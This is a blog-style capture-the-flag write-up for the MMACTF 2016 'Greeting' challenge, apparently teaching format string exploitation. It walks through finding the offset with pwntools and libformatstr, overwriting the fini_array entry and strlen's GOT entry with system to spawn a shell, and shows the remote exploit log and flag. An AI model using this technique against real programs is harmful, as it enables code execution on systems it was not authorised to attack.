Title: MMACTF 2016 - Greeting
Date: 2016-09-05 19:30
Category: CTF
Tags: ctf, mmactf2016, pwn
Slug: mmactf-2016-greeting
Authors: wumb0

Challenge description:
> Pwn  
> Host : pwn2.chal.ctf.westerns.tokyo  
> Port : 16317

## Reversing and Finding the Bug

Reversing with radare2:
<script type="text/javascript" src="https://asciinema.org/a/70ae59xl59b2fksh8uk0gvfv4.js" id="asciicast-70ae59xl59b2fksh8uk0gvfv4" async></script>

Looks like another textbook format string vulnerability because the user buffer is put into `sprintf` and then straight into `printf`. This time I had to actually do the work of getting code execution because the flag was not loaded onto the stack.

## Running the binary
I wanted to see the bug in action so I loaded up my Ubuntu VM using vagrant and checked it out:

```shell
→ ./greeting
Hello, I'm nao!
Please tell me your name... %08x
Nice to meet you, 080487d0 :)
```

Neat. Now for exploitation.

## Background
For information on `printf` and a more basic format string exploit, check out the post I did on the [judgement]({static}/posts/MMACTF/judgement.md) pwn challenge also from this CTF. In addition to having positional arguments, `printf` also has a cool feature where you can write the number of bytes that have been printed so far to a variable. This feature is what makes format string vulnerabilities so dangerous. If you can exploit one, you can get arbitrary write. 

Passing `%hn` to `printf` in the format string will write up to a half word value of the number of characters written so far. Combining this with positional arguments allows for half a word at a time to be written to anywhere. So this is bad.

If you are interested in learning more about how format string vulnerabilities work then check out [this paper](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf)

## Exploitation
I decided to use [libformatstr](https://github.com/hellman/libformatstr) for this because I have never used it before and it seemed useful so I didn't have to craft the buffer manually. 

The payload function takes two arguments: an argument number and a padding number. The offset number is the word distance in memory away from your input and the padding is the number of bytes your input needs to be padded for the addresses you enter to be word aligned. Libformatstr can be used to determine these numbers:

```python
from pwn import *
from libformatstr import *

e = ELF("./greeting")
r = process(e.path)

r.sendline(make_pattern(0x40))
r.recvuntil("you, ")
res = r.recv()
print(res)
argnum, padding = guess_argnum(res, 0x40)
log.info("argnum: {}, padding: {}".format(argnum, padding))
```

Running this resulted in an output of `argnum: 12, padding: 2`. There was one other bit that needed to be changed as well. Since "Nice to meet you, " was being prepended to my input I had to set an additional argument when setting up the format string exploit called `start_num`. 

Armed with the argument number, padding, and start number I was ready to try and overwrite some values. The issue I ran into was that there are no function calls after the call to `printf` in main. I though of trying to overwrite a destructor (dtors), but there were none. I came across a way to overwrite the `fini` section of a binary to execute a function when the program was supposed to be quitting. I could not find much documentation on exactly what I needed to overwrite to make this work so I just used `objdump` and `grep` to find the symbols with `fini` in the name:

```
→ objdump -t greeting | grep fini
08048780 l    d  .fini  00000000              .fini
08049934 l    d  .fini_array    00000000              .fini_array
08049934 l     O .fini_array    00000000              __do_global_dtors_aux_fini_array_entry
08048740 g     F .text  00000002              __libc_csu_fini
08048780 g     F .fini  00000000              _fini
```

Five choices. Through trial and error I determined that overwriting whatever was at `__do_global_dtors_aux_fini_array_entry` gave me control of the program. 

My plan of attack became the following:  
1. Overwrite `__do_global_dtors_aux_fini_array_entry` with `main`  
2. Overwrite the GOT entry for `strlen` with `system`  
3. Write the full format string line into the program  
4. When main executes the second time, write `/bin/sh` so that the call to `strlen` in the `getnline` function executes `system("/bin/sh")` and gives me a shell!

I wrote the following script to do the above:
<script src="https://gist.github.com/wumb0/1c3d32efbc3f45aa6d724ce46b7efbdd.js"></script>

Running it resulted in the flag :)
```
→ python greet2.py REMOTE
[*] '/home/vagrant/CTF/tokyo/greeting'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
[x] Opening connection to pwn2.chal.ctf.westerns.tokyo on port 16317
[x] Opening connection to pwn2.chal.ctf.westerns.tokyo on port 16317: Trying 40.74.112.206
[+] Opening connection to pwn2.chal.ctf.westerns.tokyo on port 16317: Done
[+] Wrote system onto strlen and main onto fini... trying shell
[+] got shell
[+] Flag: TWCTF{51mpl3_FSB_r3wr173_4nyw4r3}
[*] Closed connection to pwn2.chal.ctf.westerns.tokyo port 16317
```

W00t!  
**TWCTF{51mpl3_FSB_r3wr173_4nyw4r3}**
